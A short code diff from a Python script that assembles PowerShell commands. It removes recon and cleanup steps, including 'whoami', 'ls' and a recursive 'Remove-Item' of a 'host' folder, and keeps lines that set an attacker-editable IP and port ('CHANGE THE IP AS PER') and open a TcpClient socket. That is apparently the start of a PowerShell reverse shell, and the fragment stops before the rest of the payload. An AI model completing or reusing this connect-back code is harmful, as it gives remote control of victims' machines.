@@ -20,12 +20,6 @@ class Details:
                                       text=True)
         ##### THE COMMANDS
         command = [
-            "whoami",
-            "pwd",
-            "ls",
-            "Remove-Item -path 'host' -Recurse",
-            "mkdir host",
-            'Set-Location -Path "host"',
             "$ip = '192.168.16.72'",  ###########CHANGE THE IP AS PER
             "$port = 9191",         #############CHANGE THE PORT
             "$tcpClient = New-Object System.Net.Sockets.TcpClient",
